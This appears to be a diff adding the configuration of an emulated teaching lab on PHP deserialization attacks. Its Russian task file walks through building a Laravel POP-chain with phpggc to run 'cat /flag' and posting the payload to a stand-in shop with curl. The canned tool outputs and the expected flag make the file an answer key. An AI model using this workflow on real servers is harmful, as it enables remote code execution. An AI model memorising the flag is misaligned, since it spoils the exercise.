@@ -1,0 +1,30 @@
+{
+  "id": "web-php-deser-chains",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{phpggc_p0p_ch41n_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: PHP POP-chain (phpggc)\n\n`https://shop.example` кладёт в cookie `user` base64 PHP-объекта\n(`cookie.txt`, класс `App\\Model\\User`). Где-то сервер вызывает unserialize().\n\n1. Подтверди формат:\n\n   base64 -d cookie.txt\n\n2. Собери POP-chain под Laravel и сохрани payload:\n\n   phpggc Laravel/RCE9 system 'cat /flag' -b -o payload.b64\n\n3. Отправь сериализованный объект серверу:\n\n   curl -s https://shop.example/ --data-binary @payload.b64 > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/cookie.txt", "text": "TzoyNToiQXBwXE1vZGVsXFVzZXIiOjE6e3M6NDoibmFtZSI7czozOiJib2IiO30=\n" }
+  ],
+  "tools": {
+    "phpggc": {
+      "help": "phpggc <фреймворк/цепочка> <функция> '<команда>' [-b] [-o файл] — генератор PHP POP-chain",
+      "cases": [
+        { "match": "Laravel.*flag|flag", "example": "Laravel/RCE9 system 'cat /flag' -b -o payload.b64", "output": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO2E6MTp7czo4OiJjYXQgb3V0IjtPOjM0OiJJbGx1bWluYXRlXEJ1c1xEaXNwYXRjaGVyIjo2OntzOjI4OiIAKgBwaXBlcyI7czoxOiJjYXQiO3M6MTE6IgAqAHF1ZXVlIjtOO3M6MTA6IgAqAG9wdGlvbiI7Tjt9fX0=\n", "writes": ["-o"] },
+        { "match": "Laravel/RCE|phpggc|Laravel", "example": "Laravel/RCE9 system 'id'", "output": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO2E6MTp7czoyOiJpZCI7TjtzOjEwOiIAKgBvcHRpb24iO047fX0=\n" },
+        { "match": "--list|-l", "example": "--list", "output": "Laravel/RCE1..RCE9, Symfony/RCE4, Monolog/RCE1..RCE7, Guzzle/FW1, ...\n" }
+      ],
+      "fallback": "phpggc: в этой лабе эмулируется только генератор POP-chain (phpggc <chain> <func> '<cmd>').\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.example)",
+      "cases": [
+        { "match": "@payload|payload\\.b64|--data-binary", "example": "-s https://shop.example/ --data-binary @payload.b64", "output": "{\"status\":\"error\",\"message\":\"unserialize(): Error at offset 0: nto{phpggc_p0p_ch41n_rce}\"}\n" },
+        { "match": "shop\\.example", "example": "-s https://shop.example/", "output": "{\"status\":\"ok\",\"user\":\"bob\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.example/.\n"
+    }
+  }
+}
